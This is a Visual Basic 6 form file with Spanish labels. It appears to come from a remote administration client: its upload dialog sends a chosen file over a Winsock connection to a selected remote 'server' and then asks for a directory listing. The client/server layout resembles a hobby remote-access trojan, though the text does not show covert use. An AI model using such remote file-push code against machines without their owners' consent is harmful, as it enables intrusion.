VERSION 5.00
Object = "{90F3D7B3-92E7-44BA-B444-6A8E2A3BC375}#1.0#0"; "actskin4.ocx"
Object = "{F8180939-60A2-4494-B1BB-04818D7F640B}#1.0#0"; "LabelDegradado.ocx"
Begin VB.Form fmanager_d 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Ingrese ruta de archivo"
   ClientHeight    =   945
   ClientLeft      =   20745
   ClientTop       =   3375
   ClientWidth     =   4065
   LinkTopic       =   "Form5"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   945
   ScaleWidth      =   4065
   ShowInTaskbar   =   0   'False
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   2040
      Top             =   600
   End
   Begin LabelDegradado.LabelDegrade LabelDegrade1 
      Height          =   255
      Left            =   1080
      TabIndex        =   3
      Top             =   600
      Width           =   1935
      _ExtentX        =   3413
      _ExtentY        =   450
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Arial"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Text            =   "&NO colocar extension"
      BackColor       =   255
      Transparente    =   0   'False
      ShadowDepth     =   0
      ShadowStyle     =   0
      ShadowColorStart=   0
      DegradadoColorStart=   8388608
   End
   Begin VB.CommandButton Command2 
      Caption         =   "&Enviar"
      Height          =   255
      Left            =   3120
      TabIndex        =   2
      Top             =   600
      Width           =   855
   End
   Begin VB.CommandButton Command1 
      Caption         =   "&Cancelar"
      Height          =   255
      Left            =   120
      TabIndex        =   1
      Top             =   600
      Width           =   855
   End
   Begin ACTIVESKINLibCtl.Skin Skin1 
      Left            =   1800
      OleObjectBlob   =   "fmanager_d.frx":0000
      Top             =   0
   End
   Begin VB.TextBox path 
      Height          =   375
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   3855
   End
   Begin VB.Label Label1 
      Height          =   135
      Left            =   3960
      TabIndex        =   4
      Top             =   120
      Visible         =   0   'False
      Width           =   135
   End
End
Attribute VB_Name = "fmanager_d"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function PathFileExists Lib "shlwapi" Alias "PathFileExistsA" (ByVal lppath As String) As Boolean
Private Declare Function CopyFile Lib "kernel32" Alias "CopyFileA" (ByVal lpExistingFileName As String, ByVal lpNewSource As String, ByVal lpSobreexisting As Boolean) As Boolean
Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpExistingFileName As String) As Boolean

Dim vIndex As Variant
Dim Index_n As Integer

Dim extension As String
Dim arrData() As Byte
Dim size As Long

Private Sub Command1_Click()
fmanager.Enabled = True
Unload Me
End Sub

Private Sub Command2_Click()
    If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    
        extension = Split(Form2.file.FileName, ".")(1)
    
        If path.Text = "" Then
            path.Text = "default." & extension
        End If
        
        'falta configurar el envio del archivo.
        'mandamos la instruccion para que el servidor acepte nuestro archivo!
        
        Form1.Winsock1(vIndex(0)).SendData "fil" & extension & "*" & FileLen(Form2.file.FileName) & "+" & path.Text
        MsgBox "Enviando archivo al servidor", vbInformation + vbOKOnly, "Envio en proceso"

        CopyFile Form2.file.FileName, App.path & "\gen." & extension, True

        Open App.path & "\gen." & extension For Binary Access Read As #1
        size = LOF(1)
        
        'Fixing bug
        If size <= 0 Then
            Close
            Exit Sub
        End If
            
        ReDim arrData(size - 1)
        Get #1, , arrData
        Close

        Form1.Winsock1(vIndex(0)).SendData arrData
        fmanager.XP_ProgressBar1.Max = FileLen(App.path & "\gen." & extension)
        DeleteFile App.path & "\gen." & extension
        
        If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    
            fmanager.arch.ListItems.Clear
            Form1.Winsock1(vIndex(0)).SendData "diz" & Label1.Caption & "*"
        End If
        
        fmanager.Enabled = True
        
        Unload Me
   
    Else
        lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
        Unload Me
    End If
End Sub

Private Sub Form_Load()
Index_n = (Form1.LV.SelectedItem.Index)
vIndex = Split(Form1.LV.ListItems(Index_n).Key, "|")

If PathFileExists(App.path & "\sk\skin.skn") Then
    Skin1.LoadSkin App.path & "\sk\skin.skn"
    Skin1.ApplySkin fmanager_d.hwnd
End If
End Sub

Private Sub Form_Unload(Cancel As Integer)
fmanager.Enabled = True
End Sub

Private Sub path_KeyPress(KeyAscii As Integer)

If KeyAscii = 13 Then
    If Form1.Winsock1(vIndex(0)).state = sckConnected Then
    
        extension = Split(Form2.file.FileName, ".")(1)
    
        If path.Text = "" Then
            path.Text = "default." & extension
        End If
        
        'falta configurar el envio del archivo.
        'mandamos la instruccion para que el servidor acepte nuestro archivo!
        
        Form1.Winsock1(vIndex(0)).SendData "fil" & extension & "*" & FileLen(Form2.file.FileName) & "+" & path.Text
        MsgBox "Enviando archivo al servidor", vbInformation + vbOKOnly, "Envio en proceso"

        CopyFile Form2.file.FileName, App.path & "\gen." & extension, True

        Open App.path & "\gen." & extension For Binary Access Read As #1
        size = LOF(1)
        ReDim arrData(size - 1)
        Get #1, , arrData
        Close

        Form1.Winsock1(vIndex(0)).SendData arrData
        DeleteFile App.path & "\gen." & extension
        
        Unload Me
   
    Else
        lista.List1.ListItems.Add , , "[ Error al procesar comando - conexion perdida ]"
        Unload Me
    End If
End If

End Sub

Private Sub Timer1_Timer()
fmanager.Enabled = False
End Sub
